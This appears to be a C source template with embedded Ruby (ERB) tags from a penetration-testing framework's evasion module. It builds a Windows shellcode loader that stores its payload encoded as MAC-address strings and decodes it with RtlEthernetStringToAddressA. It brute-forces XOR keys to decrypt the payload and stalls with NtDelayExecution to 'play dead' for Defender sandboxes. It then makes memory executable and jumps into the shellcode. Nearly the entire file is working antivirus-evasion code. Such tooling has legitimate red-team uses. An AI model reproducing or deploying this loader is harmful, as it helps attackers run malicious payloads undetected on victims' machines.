#include <windows.h>
#include <stdio.h>
#include "<%= File.join(Msf::Config.data_directory, 'headers', 'windows', 'obfusheader.h') %>"

#define SCSIZE <%= encoded_payload_length %>
#define SCSIZE_ENC <%= encrypted_payload_length %>

char bPayload[SCSIZE_ENC];
char bPayloadEncoded[<%= encrypted_payload.length %>] = "<%= encrypted_payload %>";
char bControlBytes[<%= encryption_rounds %>] = "<%= control_bytes %>";

typedef NTSTATUS (__stdcall *fnNtDelayExecution)(
	BOOLEAN              Alertable,
	PLARGE_INTEGER       DelayInterval
);

typedef NTSTATUS(__stdcall* fnRtlEthernetStringToAddressA)(
    PCSTR              S,
    PCSTR* Terminator,
    PVOID              Addr
    );

void DecodePayload()
{
    PCSTR terminator = NULL;
    PBYTE tmp = (PBYTE)(&bPayload);

    //TODO: API hashing here pls
    fnRtlEthernetStringToAddressA fncMacDeobfuscate = (fnRtlEthernetStringToAddressA)GetProcAddress(LoadLibrary(OBF("ntdll.dll")), OBF("RtlEthernetStringToAddressA"));

    for (int i = 0; i != SCSIZE ; i+=1) {
        fncMacDeobfuscate(bPayloadEncoded+i*18, &terminator, (LPCSTR)tmp);
        tmp = tmp + 6;
    }
}

int PlayDeadForDefender()
{

    DWORD               dwMilliSeconds        = 24000;
	LARGE_INTEGER       DelayInterval         = { 0 };
	LONGLONG            Delay                 = 0;
    NTSTATUS            STATUS                = 0;
        DWORD               _T0                   = 0, 
        _T1                   = 0;
        
    Delay = dwMilliSeconds * 10000;
	DelayInterval.QuadPart = - Delay;

    fnNtDelayExecution fncNtDelayExecution = (fnNtDelayExecution)GetProcAddress(LoadLibrary(OBF("ntdll.dll")), OBF("NtDelayExecution"));

    _T0 = GetTickCount();

    STATUS = fncNtDelayExecution(FALSE, &DelayInterval);
    if (STATUS != 0) {
        return 0;
        }

    _T1 = GetTickCount();

    if (_T1 - _T0 < dwMilliSeconds) {
        return 0;
    }

    return 1;
}

char GetKey(char control_byte)
{
	char hardcoded = bPayload[0];
	for (int i = 0; i <= 255; i++)
	{
		char res = i ^ hardcoded;
                if (res == (char)(control_byte)){
			return (char)i;
                } 
	}
        }

        void DecryptPayload(char control_byte)
        {
                char key = GetKey(control_byte);
                for (int i = 0; i < SCSIZE_ENC; i++)
                {
                        bPayload[i] = bPayload[i] ^ key;
                }
        }
int main() {
    DWORD dwOldProtect;
    char* payload_fnc = NULL;
    printf("Playing dead for defender\n"); 
    if(!PlayDeadForDefender())
    {
      return -1;
    }
    printf("Decoding and decrypting\n"); 
    DecodePayload();
    for(int i = 0; i < <%= encryption_rounds %>; i++)
    {
            DecryptPayload(bControlBytes[i]);
    }
    payload_fnc = bPayload+1;
    VirtualProtect(bPayload, SCSIZE_ENC, PAGE_EXECUTE_READWRITE, &dwOldProtect);
    printf("Calling payload\n"); 
    (*(void (*)()) payload_fnc)();

    return 1;
}

